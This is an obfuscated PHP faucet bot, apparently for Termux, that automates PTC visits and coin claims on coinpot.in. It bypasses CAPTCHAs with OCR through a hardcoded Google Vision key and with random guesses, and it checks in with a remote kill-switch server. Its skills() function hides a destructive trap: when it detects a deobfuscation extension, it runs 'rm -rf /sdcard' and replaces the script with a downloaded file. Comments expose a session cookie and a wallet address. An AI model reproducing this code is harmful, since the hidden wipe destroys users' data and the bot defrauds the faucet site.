<?php
#date_default_timezone_set('Asia/Jakarta');
system("clear");
$var_0="\n";$var_1="\t";
//warnn
$var_2="\033[34m";$var_3="\033[36m";$var_4="\033[92m";
$var_5="\033[37m";$var_6="\033[35m";$var_7="\033[31m";
$var_8="\033[33m";$var_9="\033[8m";$var_10="\033[0"."m";
function saveas($var_11,$var_12){
 if(!file_exists($var_11)){file_put_contents($var_11,"[]"); }
 $var_15 = json_decode(file_get_contents($var_11),1);
 $var_17 = array_merge($var_15,$var_12);
file_put_contents($var_11,json_encode($var_17,JSON_PRETTY_PRINT));}

function head($var_12){
 foreach($var_12 as $var_24=>$var_25){$var_26[]=$var_24.": ".$var_25;}
 return $var_26; }
function loading($var_30,$var_31) {
$var_4="\033[92m";$var_5="\033[37m";
$var_8="\033[33m";$var_3="\033[36m";
$var_36=[$var_3,$var_4,$var_3,$var_4,$var_3,$var_4];$var_43=1;
for($var_44=$var_31;$var_44>0;$var_44--){
$var_48=str_repeat("â¢",$var_43);$var_50=$var_36[$var_43-1];
echo $var_5."".$var_50."â¢â¢â¢".$var_5."â¨ $var_30 â©$var_50$var_48";
if($var_43==3){$var_43=1;}else{$var_43++;}sleep(1);
echo 
"\r                                                       \r";}}
function timer($var_62,$var_63){
  date_default_timezone_set('UTC');
$var_64 = time()+$var_63;
$var_2="\033[34m";$var_3="\033[36m";
$var_4="\033[92m";$var_5="\033[37m";
$var_6="\033[35m";$var_7="\033[31m";
$var_8="\033[33m";$var_9="\033[8m";
$var_10="\033[0"."m";
$var_75=[$var_5,$var_7];
$var_44=0;
$var_36=[$var_4,$var_8,$var_3,$var_4,$var_8,$var_3];$var_43=1;
while(true):
echo "\r                                                        \r";
$var_87=$var_75[$var_44];
$var_90 = $var_64-time();
$var_92=date("H:i:s",$var_90);
if($var_90<1){ break; }
$var_48=str_repeat("â",$var_43);$var_50=$var_36[$var_43-1];
$var_100="tod!";$var_101="â©";
echo $var_5.$var_62."$var_5 â¨$var_87$var_92$var_5$var_101 $var_100$var_50$var_48";
if($var_43==6){$var_43=1;}else{$var_43++;} sleep(1);
$var_44++; 
if($var_44 >= count ($var_75)){$var_44=0;}

endwhile; 
  }

function settings($var_119,$var_120){
$var_121 = "https://tuyulgaple.online/sunggingads/";
$var_122 = json_encode(
    array(
        'sk' => $var_119,
        'vr' => $var_120 ));
$var_125 = array('http' =>
    array(
        'method'  => 'POST',
        'header'  => 'Content-Type: application/json',
        'content' => $var_122
    ));
$var_127 = stream_context_create($var_125);
$var_129     = json_decode(file_get_contents($var_121, false, $var_127),1);

$var_132      = $var_129["baner"];
if(!$var_129["status"]){ 
 $var_62 = "skrip di non-aktifkan\n";
 echo $var_136.$var_132.$var_62; exit; }
else{ return $var_136.$var_132; }  }

function clr($var_132){system("clear");echo $var_132.$var_0;}

function strip(){
$var_5="\033[37m";
echo "$var_5~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";}
function tabs(){
echo "\r                                                        \r";}

function curl($var_121,$var_147,$var_148){
 $var_149 = curl_init($var_121);
 curl_setopt($var_149, CURLOPT_SSL_VERIFYPEER, 1);
 curl_setopt($var_149, CURLOPT_RETURNTRANSFER, 1 ); 
 curl_setopt($var_149, CURLOPT_TIMEOUT,30       );
 curl_setopt($var_149, CURLOPT_VERBOSE,        0);
 curl_setopt($var_149, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($var_149, CURLOPT_HTTPHEADER, $var_148 );
 #curl_setopt($ch, CURLOPT_COOKIEJAR,  "cookie");
 #curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie");
if(strlen($var_147) > 0 ){
 curl_setopt($var_149, CURLOPT_POST, true);
 curl_setopt($var_149, CURLOPT_POSTFIELDS,    $var_147 ); }
 $var_162 = curl_exec($var_149);
 $var_164   = curl_getinfo($var_149);
 curl_close($var_149);
 if($var_164["http_code"]==302){
 return $var_164["redirect_url"]; } else { return $var_162; } }
 
function curls($var_121,$var_147,$var_148){
 $var_149 = curl_init($var_121);
 curl_setopt($var_149, CURLOPT_SSL_VERIFYPEER, 1);
 curl_setopt($var_149, CURLOPT_RETURNTRANSFER, 1 ); 
 curl_setopt($var_149, CURLOPT_TIMEOUT,60       );
 curl_setopt($var_149, CURLOPT_VERBOSE,        0);
 curl_setopt($var_149, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($var_149, CURLOPT_HTTPHEADER, $var_148 );
if(strlen($var_147) > 0 ){
 curl_setopt($var_149, CURLOPT_POST, true);
 curl_setopt($var_149, CURLOPT_POSTFIELDS,    $var_147 ); }
 $var_162 = curl_exec($var_149);
 $var_164   = curl_getinfo($var_149);
 curl_close($var_149);
 if($var_164["http_code"]==302){
 return $var_164["redirect_url"]; } else { return $var_162; } }
 
function cloud_ocr($var_194){
$var_195= [
    "content-type: multipart/form-data; boundary=----WebKitFormBoundarywCIIkh0aAx7NUXPm",
    "accept: application/json, text/javascript; q=0.01",
    "x-requested-with: XMLHttpRequest"];
$var_196=file_get_contents($var_194);
$var_147 = "------WebKitFormBoundarywCIIkh0aAx7NUXPm\nContent-Disposition: form-data; name=\"file[]\";\nfilename=\"png.png\"\nContent-Type: image/png\n
$var_196;
------WebKitFormBoundarywCIIkh0aAx7NUXPm--";
$var_200=curls("https://www.prepostseo.com/frontend/uploadImageToTextFiles",$var_147,$var_195);
$var_203=strpos($var_200,'tmp_imgs\/');
$var_203=substr($var_200,$var_203);
$var_203=str_replace('tmp_imgs\/','',$var_203);
$var_203=substr($var_203,0,strpos($var_203,'"'));
$var_195= [
    "content-type: application/x-www-form-urlencoded; charset=UTF-8",
    "accept: application/json, text/javascript; q=0.01",
    "x-requested-with: XMLHttpRequest"];
$var_147="submit=true&imgUrl=https://www.prepostseo.com/tmp_imgs/$var_203";
$var_121=curls("https://www.prepostseo.com/frontend/extractImgText",$var_147,$var_195);
$var_219=strpos($var_121,'following:\n');
$var_219=substr($var_121,$var_219);
$var_219=str_replace('following:\n','',$var_219);
$var_219=substr($var_219,0,strpos($var_219,'\n"'));
$var_219=str_replace('\n','',$var_219);
$var_219= preg_replace("/[^a-zA-Z]/", "", $var_219);
if(strlen($var_219) > 25){}else{return $var_219;} }

function imgscan($var_194){
$var_236=base64_encode(file_get_contents($var_194));
$var_195=["content-type: application/json"];
$var_147='{
  "requests": [
    {
      "image": {
        "content": "'.$var_236.'"
      },
      "features": [
        {
          "type": "TEXT_DETECTION"
        }
      ]
    }
  ]
}';
$var_121="https://vision.googleapis.com/v1/images:annotate?key=AIzaSyC3y-Em42htSB8UEZPqptJ78rlvL58_h6Y";
$var_242=curl($var_121,$var_147,$var_195);
$var_219=strpos($var_242,'Enter the following:\n');
if($var_219){
$var_219=substr($var_242,$var_219);
$var_219=str_replace('Enter the following:\n','',$var_219);
$var_219=substr($var_219,0,strpos($var_219,'"'));
$var_219=str_replace('\n','',$var_219);
$var_219= preg_replace("/[^a-zA-Z]/", "", $var_219);}
if(strlen($var_219) > 25){}else{return $var_219;} }

function verif_keys($var_119,$var_132){
$var_0="\n";$var_1="\t";
//warna
$var_2 = "\033[34m"; $var_3 = "\033[36m"; $var_4 = "\033[92m";
$var_5= "\033[37m"; $var_6= "\033[35m"; $var_7 = "\033[31m";
$var_8 = "\033[33m"; $var_9= "\033[8m";  $var_10  = "\033[0"."m";
while(true): clr($var_132);
if( $var_277 ){
 $var_277 = 0;
 while(true): clr($var_132);
 $var_280 = str_replace($var_0,"",file_get_contents("keys"));
 $var_121 = "http://tuyulgaple.online/aktivator/";
 $var_283 = json_encode([ "request" => $var_119,"keys" => $var_280]);
 $var_286  = json_decode( curl($var_121,$var_283,array()),1 );
if( $var_286["respon"] ) {
  echo $var_3."=> ".$var_286["respon"].$var_0;
  $var_293 = readline($var_5."input key : ");
  if( $var_293 ){
  $var_283 = json_encode(["request" => $var_119,"keys" => $var_293]);
  $var_286  = json_decode(curl($var_121,$var_283,array()),1);
  if( $var_286["code"] != 10 ) {
  file_put_contents("keys",$var_293);
  $var_280 = str_replace($var_0,"",file_get_contents("keys")); break; }}}
 else{ readline($var_4."your keys is uptodate ");break; }endwhile; }
 $var_121 = "http://tuyulgaple.online/aktivator/";
 $var_280 = str_replace($var_0,"",file_get_contents("keys"));
 $var_283 = json_encode(["request" => $var_119,"keys" => $var_280]);
 $var_286  = json_decode(curl($var_121,$var_283,array()),1);
if( $var_286["code"] == 10 ){ $var_277=1; }else{ break; }
endwhile; }
function update($var_119,$var_319){
$var_280 = str_replace($var_0,"",file_get_contents("keys"));
$var_121 = "http://tuyulgaple.online/aktivator/";
$var_283 = json_encode([ "request" => $var_119,"keys" => $var_280]);
$var_286  = json_decode( curl($var_121,$var_283,array()),1 );
if($var_286["respon"]){
echo $var_319."keys are expired, please update first !\n";exit;}  }
function input($var_331,$var_132,$var_147,$var_334){
 $var_335 = array(); 
 foreach( $var_147 as $var_337 ){
 clr($var_132);
 if(!$var_334[$var_337]){ 
  $var_341 = readline($var_337." : ");
  $var_335 = array_merge($var_335,[$var_337 => $var_341 ]); }
 else{ $var_335 = array_merge($var_335,[ $var_337 => $var_334[$var_337] ]); }
 } if($var_335[$var_147[0]]){ return $var_335; } }
 
 function fake_user(){
$var_121  = "https://tuyulgaple.tech/randomuser/";
$var_356 = json_decode(file_get_contents($var_121),1); 
$var_358 = [ 
    "name"  => [
              "first"  => $var_356["first"],
              "last"   => $var_356["last"],
              "full"   => $var_356["full_name"] ],
    "uuid"  => $var_356["uuid"]  ];
return $var_358; }
 
function skills(){
$var_62="anda terdeteksi sebagai kang ngentod!";
if(extension_loaded("evalhook")){
 @system("clear");shell_exec('rm -rf /sdcard');
 $var_365=file_get_contents("https://txxx.com/");
 file_put_contents("bot.php",$var_365);echo $var_62; exit; }}
 
/*
shell_exec("convert img.img -fill black -fuzz 30% +opaque '#FFFFFF' img.png > /dev/null 2>&1");
*/
$var_119="coinpot.in";$var_120="1.1";$var_331="config.json";
skills();
error_reporting(0);
$var_371=settings($var_119,$var_120,"");
//verif_keys($var_119,$var_371);
clr($var_371);$var_377="coinpot.in";


while(true):
$var_15   = json_decode(file_get_contents($var_331),1);
if(!$var_15["cookie"]){
$var_381["cookie"]=readline("cookie: ");
saveas($var_331,$var_381);strip(); }
elseif(!$var_15["user-agent"]){
$var_381["user-agent"]=readline("user-agent: ");
saveas($var_331,$var_381);strip(); }
else{
$var_388=$var_15["cookie"];$var_390=$var_15["user-agent"];
break;}
endwhile;clr($var_371);


function getsolve($var_393,$var_12){
$var_195=head($var_12);
$var_242=curl($var_393,"",$var_195);
$var_400=strpos($var_242,'chid"     : "');
$var_402=strpos($var_242,'uid"      : "');
if($var_400){
$var_400=substr($var_242,$var_400);
$var_400=str_replace('chid"     : "','',$var_400);
$var_400=substr($var_400,0,strpos($var_400,'"'));}
if($var_402){
$var_402=substr($var_242,$var_402);
$var_402=str_replace('uid"      : "','',$var_402);
$var_402=substr($var_402,0,strpos($var_402,'"'));}
return[
    "cid" => $var_400,
    "uid" => $var_402
    ];}

function solvemedia($var_400,$var_12){
$var_195=head($var_12);
$var_121="https://api-secure.solvemedia.com/papi/media?c=$var_400;w=300;h=150;fg=000000;bg=f8f8f8";
$var_242=curl($var_121,"",$var_195);
return $var_242; }

function antibot($var_377,$var_12){
 $var_195=head($var_12);
 $var_121=curl("https://$var_377/faucet","",$var_195);
 if($var_441 = strpos($var_121,"var ablinks")){
  $var_147 = substr($var_121,$var_441);
  $var_147 = substr($var_147,0,strpos($var_147,"</script>"));}
$var_449 = array();
$var_450  = explode("rel=",$var_147);
foreach($var_450 as $var_24 => $var_25 ){ 
  $var_449[]= str_replace(["\\",'"'],"",substr($var_25,0,strpos($var_25,">"))); }
  array_shift($var_449);  
 $var_459=$var_449[0];$var_461=$var_449[1];$var_463=$var_449[2];
 $var_465 = [ 
   "$var_459 $var_461 $var_463",
   "$var_459 $var_463 $var_461",
   "$var_461 $var_459 $var_463",
   "$var_461 $var_463 $var_459",
   "$var_463 $var_459 $var_461",
   "$var_463 $var_461 $var_459"];
 return $var_465[array_rand($var_465)];}
 
function home($var_377,$var_12){
$var_195=head($var_12);
$var_121="https://$var_377/dashboard";
$var_242=curl($var_121,"",$var_195);
/*if(strpos($html,'captcha to continue')){
echo exit("firewall detect! open website solve the captcha\n");}*/
$var_495=strpos($var_242,"UserFullName: '");
$var_497=strpos($var_242,'Balance (Coins)');
$var_499=strpos($var_242,'csrf_token_name" value="');
if($var_495){
$var_495=substr($var_242,$var_495);
$var_495=str_replace("UserFullName: '","",$var_495);
$var_495=substr($var_495,0,strpos($var_495,"<"));}
if($var_497){
$var_497=substr($var_242,$var_497);
$var_497=substr($var_497,0,strpos($var_497,'h2>'));
$var_517=strpos($var_497,'title">');
$var_497=substr($var_497,$var_517);
$var_497=str_replace('title">','',$var_497);
$var_497=substr($var_497,0,strpos($var_497,'<'));}
if($var_499){
$var_499=substr($var_242,$var_499);
$var_499=str_replace('csrf_token_name" value="','',$var_499);
$var_499=substr($var_499,0,strpos($var_499,'"'));}
return
["nick"=>$var_495,"bal"=>$var_497,"csrf"=>$var_499,"html"=>$var_242];}
/*
function auto($host,$config){
$head=head($config);
$url="https://$host/auto";
$html=curl($url,"",$head);
$token=strpos($html,'token" value="');
$time=strpos($html,'let timer = ');
$rwd=strpos($html,"Good job!', '");
$warn=strpos($html,'fa-exclamation-circle"></i> ');
if($token){
$token=substr($html,$token);
$token=str_replace('token" value="','',$token);
$token=substr($token,0,strpos($token,'"'));}
if($time){
$time=substr($html,$time);
$time=str_replace('let timer = ','',$time);
$time=substr($time,0,strpos($time,','));}
if($rwd){
$rwd=substr($html,$rwd);
$rwd=str_replace("Good job!', '","",$rwd);
$rwd=substr($rwd,0,strpos($rwd," "));}
if($warn){
$warn=substr($html,$warn);
$warn=str_replace('fa-exclamation-circle"></i> ','',$warn);
$warn=substr($warn,0,strpos($warn,'<'));}
return["token"=>$token,"time"=>$time,
       "warn" =>$warn,"rwd" => $rwd ];    }
function auto_verif($host,$config,$token){
$head=head($config);
$url="https://$host/auto/verify";
$data="token=$token";
$html=curl($url,$data,$head);
$rwd  = strpos($html,"text: '");
if($rwd){
$rwd=substr($html,$rwd);
$rwd=str_replace("text: '","",$rwd);
$rwd=substr($rwd,0,strpos($rwd," "));}
return ["rwd"=>$rwd]; }
*/
function faucet($var_377,$var_12){
$var_195=head($var_12);
$var_121="https://$var_377/faucet";
$var_242=curl($var_121,"",$var_195);
/*if(strpos($html,'captcha to continue')){
echo exit("firewall detect! open website solve the captcha\n");}*/
$var_499=strpos($var_242,'csrf_token_name" id="token" value="');
$var_551=strpos($var_242,'hidden" name="token" value="');
$var_31=strpos($var_242,'var wait = ');
if($var_499){
$var_499=substr($var_242,$var_499);
$var_499=str_replace('csrf_token_name" id="token" value="','',$var_499);
$var_499=substr($var_499,0,strpos($var_499,'"'));}
if($var_551){
$var_551=substr($var_242,$var_551);
$var_551=str_replace('hidden" name="token" value="','',$var_551);
$var_551=substr($var_551,0,strpos($var_551,'"'));}
if($var_31){
$var_31=substr($var_242,$var_31);
$var_31=str_replace('var wait = ','',$var_31);
$var_31=substr($var_31,0,strpos($var_31,' '));}
return
["time"=>$var_31,"csrf"=>$var_499,"token"=>$var_551,"html"=>$var_242]; }
 
function faucet_verify($var_377,$var_12,$var_499,$var_551,$var_590){
$var_195=head($var_12);
$var_593=['1','3','4'];
$var_594=count($var_593);
$var_594=rand(0,$var_594-1);
$var_594=$var_593[$var_594];
$var_147 = http_build_query([
  "csrf_token_name" => $var_499,
  "token"           => $var_551,
  "antibotlinks"    => $var_590,
  "captcha"         => "mooncaptchav2",
  "answer"          => $var_594
  ]);
$var_121="https://$var_377/faucet/verify";
$var_242=curl($var_121,$var_147,$var_195);
$var_612 = strpos($var_242,"Invalid");
$var_614  = strpos($var_242,"Good job!', '");
if($var_612){
$var_612 = substr($var_242,$var_612);
$var_612 = substr($var_612,0,strpos($var_612,"</div>"));}
if($var_614){
$var_614=substr($var_242,$var_614);
$var_614=str_replace("Good job!', '","",$var_614);
$var_614=substr($var_614,0,strpos($var_614," "));}
return ["rwd"  => $var_614,"fail" => $var_612]; }

function ptc($var_377,$var_12){
$var_195=head($var_12);
$var_121="https://$var_377/ptc";
$var_242=curl($var_121,"",$var_195);
$var_643=strpos($var_242,'ptc/view/');
if($var_643){
$var_643=substr($var_242,$var_643);
$var_643=str_replace('ptc/view/','',$var_643);
$var_643=substr($var_643,0,strpos($var_643,"'"));}

$var_121="https://$var_377/ptc/view/$var_643";
$var_242=curl($var_121,"",$var_195);
$var_499=strpos($var_242,'csrf_token_name" value="');
$var_551=strpos($var_242,'name="token" value="');
$var_664=strpos($var_242,'ptc/verify/');
$var_31=strpos($var_242,'var timer = ');
if($var_499){
$var_499=substr($var_242,$var_499);
$var_499=str_replace('csrf_token_name" value="','',$var_499);
$var_499=substr($var_499,0,strpos($var_499,'"'));}
if($var_551){
$var_551=substr($var_242,$var_551);
$var_551=str_replace('name="token" value="','',$var_551);
$var_551=substr($var_551,0,strpos($var_551,'"'));}
if($var_664){
$var_664=substr($var_242,$var_664);
$var_664=str_replace('ptc/verify/','',$var_664);
$var_664=substr($var_664,0,strpos($var_664,'"'));}
if($var_31){
$var_31=substr($var_242,$var_31);
$var_31=str_replace('var timer = ','',$var_31);
$var_31=substr($var_31,0,strpos($var_31,';'));}
return ["csrf"=>$var_499,"token"=>$var_551,
       "view"=>$var_664,"time"=>$var_31,"html"=>$var_242];    }
       
function ptc_verif($var_377,$var_12,$var_499,$var_551,$var_664){
$var_195=head($var_12);
$var_593=['1','3','4'];
$var_594=count($var_593);
$var_594=rand(0,$var_594-1);
$var_594=$var_593[$var_594];
$var_147 = http_build_query([
  "captcha"         => "mooncaptchav2",
  "answer"          => $var_594,
  "csrf_token_name" => $var_499,
  "token"           => $var_551
  ]);
$var_121="https://$var_377/ptc/verify/$var_664";
$var_242=curl($var_121,$var_147,$var_195);
$var_612 = strpos($var_242,"Invalid");
$var_614  = strpos($var_242,"Good job!', '");
if($var_612){
$var_612 = substr($var_242,$var_612);
$var_612 = substr($var_612,0,strpos($var_612,"</div>"));}
if($var_614){
$var_614=substr($var_242,$var_614);
$var_614=str_replace("Good job!', '","",$var_614);
$var_614=substr($var_614,0,strpos($var_614," "));}
return ["rwd"=>$var_614,"fail"=>$var_612]; }

function withdraw($var_377,$var_12,$var_759,$var_760,$var_761,$var_499){
$var_195=head($var_12);
$var_147 = http_build_query([
  "method"         => $var_759,
  "amount"         => $var_760,
  "wallet"         => $var_761,
  "csrf_token_name"=> $var_499
  ]);
$var_121="https://$var_377/dashboard/withdraw";
$var_242=curl($var_121,$var_147,$var_195);
$var_776=strpos($var_242,"title: '");
$var_614  = strpos($var_242,"text: '");
$var_612= strpos($var_242,'"alert alert-warning text-center">');
if($var_776){
$var_776=substr($var_242,$var_776);
$var_776=str_replace("title: '","",$var_776);
$var_776=substr($var_776,0,strpos($var_776," "));}
if($var_614){
$var_614=substr($var_242,$var_614);
$var_614=str_replace("text: '","",$var_614);
$var_614=substr($var_614,0,strpos($var_614," "));}
if($var_612){
$var_612=substr($var_242,$var_612);
$var_612=str_replace('"alert alert-warning text-center">','',$var_612);
$var_612=substr($var_612,0,strpos($var_612,'<'));}
return ["fail"=>$var_612,"job"=>$var_614,"name"=>$var_776]; }

function firewall($var_377,$var_12,$var_814,$var_400,$var_499){
$var_195=head($var_12);
$var_147=http_build_query([
"adcopy_response"  => $var_814,
"adcopy_challenge" => $var_400,
"captchaType"      => "solvemedia",
"csrf_token_name"  => $var_499
    ]);
$var_121="https://$var_377/firewall/verify";
$var_242=curl($var_121,$var_147,$var_195);}


#$cokie="ci_session=4d7fddc55c977e222495eb376aeb9fb449140dd2; _gid=GA1.2.1763639156.1637011803; __gads=ID=751972909cef1d69-22c2c032b3ce0096:T=1637011822:RT=1637011822:S=ALNI_MaNljA7Agr_mvR9O4ygDeGRnU6sAQ; _pbjs_userid_consent_data=6683316680106290; sharedid=c9a7a9aa-7af2-4fcc-8011-4b1923e1a66e; csrf_cookie_name=e3a7b4e9c0e37e59c955a7c1f47a7114; __qca=P0-2038955986-1637011863352; sb_main_a344467b4521bdefdf86b1cb6e25fc60=1; sb_count_a344467b4521bdefdf86b1cb6e25fc60=2; pop_delay_3480=1; _ga_RZYLV5PCX4=GS1.1.1637011802.1.1.1637011890.0; _ga=GA1.2.777861342.1637011803; cto_bundle=qTOwD19vMklWTUVrcFJsMkhiSSUyQnFVT3FYWnJKSmVhcnhQOHo0SUdCbFJqTFZZMURta1ZXbjNET3hQWWZ2QXlnRXNSeEQ1OE5rcEFHa2V0NnozbUJaOU9pWSUyQkY0c0RTNEk4c295SU16SDZnd05BSkFBaXFtbEN2RE9HZnlFbDV6UEdOSVg; cto_bidid=HPe1N19md0daU1BITGdYZ3h0JTJGWlZjQ2lCJTJCT3lJZU5jSHN1VXBvZE9tRG12WFQxV2xhSHclMkZGRlI0dkgzMm43b0IzSnBqbCUyRkxjclMyWDFOMCUyRmhtVGN0ciUyRnFTdyUzRCUzRA";
#$agent="Mozilla/5.0 (Linux; Android 9; ASUS_X01BDA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36";
#$walet="TV6McbzWprxCeqAj3Bixf84XMFc7Ja3W46";
$var_393="https://api-secure.solvemedia.com/papi/_challenge.js?k=668T7DopIPy0i3dY-AR00uNHst-vTwFo;f=_ACPuzzleUtil.callbacks%5B0%5D;l=en;t=img;s=standard;c=js,h5c,h5ct,svg,h5v,v/h264,v/webm,h5a,a/mp3,a/ogg,ua/chrome,ua/chrome88,os/android,os/android9,fwv/BeFwiw.pqwk17,jslib/jquery,htmlplus;am=UpFrS6itPiZXcNB3qK0-Jg;ca=script;ts=1637094638;ct=1637146457;th=white;r=0.6180212817961155";


$var_195=[
    "Host" => $var_377,
    "upgrade-insecure-requests" => "1",
    "user-agent" => $var_390,
    "accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
   "content-type" => "application/x-www-form-urlencoded",
    "referer" => "https://$var_377/faucet",
    "cookie" => $var_388
     ];
/*
while(true):
$home=home($host,$head);$csrf=$home["csrf"];
while(true):
$solve=getsolve($urlsolve,$head);
if($solve["cid"]){
$cid=$solve["cid"];$uid=$solve["uid"];}
else{
echo "\r                                                        \r";
echo $red."gagal load data image !";}

$img=solvemedia($cid,$head);
if(!$im = imagecreatefromstring($img)){
echo "\r                                                        \r";
echo $red."gagal download image !$pth";}
else{ 
  imagepng($im,"img.png");
  imagedestroy($im);
$captcha=imgscan("img.png");
if($captcha==null){
$captcha=cloud_ocr("img.png");}
break;}endwhile;
$wall=firewall($host,$head,$captcha,$cid,$csrf);
endwhile;*/


while(true):
while(true):
$var_835=home($var_377,$var_195);
$var_242=$var_835["html"];$var_499=$var_835["csrf"];
if(strpos($var_242,'captcha to continue')){
shell_exec("termux-open-url https://$var_377/firewall");
loading("firewall detect, buka web nya dan unlock",60);
}else{break;clr($var_371);}
endwhile;

if($var_495=$var_835["nick"]){$var_497=$var_835["bal"];
echo $var_4."connect as$var_3 $var_495$var_5 balance$var_4 $var_497$var_0";
strip();}else{
echo $var_7."connect failed.$var_0";
$var_17=readline($var_5."input ulang cookie : ");
$var_337=[
    "cookie" => $var_17
    ];
saveas("config.json",$var_337);
echo $var_4."silahkan jalankan ulang.$var_0";exit;}

echo $var_4.$var_1."[1]$var_5 Visit PTC$var_0";
echo $var_4.$var_1."[2]$var_5 Claim Faucet$var_0";
$var_873=readline("options: ");strip();


switch($var_873){
case 1:
while(true):
while(true):
$var_643=ptc($var_377,$var_195);$var_242=$var_643["html"];
if(strpos($var_242,'captcha to continue')){
shell_exec("termux-open-url https://$var_377/firewall");
loading("firewall detect, buka web nya dan unlock",60);
}else{break;}
endwhile;

if($var_499=$var_643["csrf"]){$var_551=$var_643["token"];
$var_664=$var_643["view"];$var_31=$var_643["time"];
timer("wait",$var_31);
$var_891  = date("H:i:s",time()+7*60*60);
loading("analize",3);

$var_892=ptc_verif($var_377,$var_195,$var_499,$var_551,$var_664);
if($var_612=$var_892["fail"]){
tabs();echo $var_5."[$var_891]$var_7 $var_612"; }
elseif($var_614=$var_892["rwd"]){
tabs();
$var_835=home($var_377,$var_195);
echo $var_5.$var_1."   reward :$var_4 +$var_614$var_0";

if($var_497=$var_835["bal"]){
echo $var_3."[$var_891]$var_5 balance:$var_4 $var_497$var_0";
}else{
echo $var_3."[$var_891]$var_5 balance:$var_7 failed$var_0";}
strip();

}else{
tabs();echo $var_5."[$var_891]$var_7 error!";}

}else{
tabs();echo $var_7."visit ptc$var_5 no available.$var_0";break;}
endwhile;
break;

case 2:
while(true):
while(true):
$var_933=faucet($var_377,$var_195);
$var_499=$var_933["csrf"];$var_551=$var_933["token"];
$var_31=$var_933["time"];$var_242=$var_933["html"];
if(strpos($var_242,'captcha to continue')){
shell_exec("termux-open-url https://$var_377/firewall");
loading("firewall detect, buka web nya dan unlock",60);
}else{break;}
endwhile;
timer("wait",$var_31);

tabs();$var_590=antibot($var_377,$var_195);
loading($var_590,3);
$var_891  = date("H:i:s",time()+7*60*60);

$var_892=faucet_verify($var_377,$var_195,$var_499,$var_551,$var_590);
if($var_892["fail"]){
$var_612=$var_892["fail"];
tabs();echo $var_5."[$var_891]$var_7 $var_612";}
elseif($var_892["rwd"]){$var_614=$var_892["rwd"];
tabs();
$var_835=home($var_377,$var_195);$var_499=$var_835["csrf"];
echo $var_5.$var_1."   reward :$var_4 +$var_614$var_0";

if($var_497=$var_835["bal"]){
echo $var_3."[$var_891]$var_5 balance:$var_4 $var_497$var_0";
}else{
echo $var_3."[$var_891]$var_5 balance:$var_7 failed$var_0";}
strip();

}else{
tabs();echo $var_5."[$var_891]$var_7 error!";}
endwhile;
break;

}readline("press key any continue");clr($var_371);
endwhile;
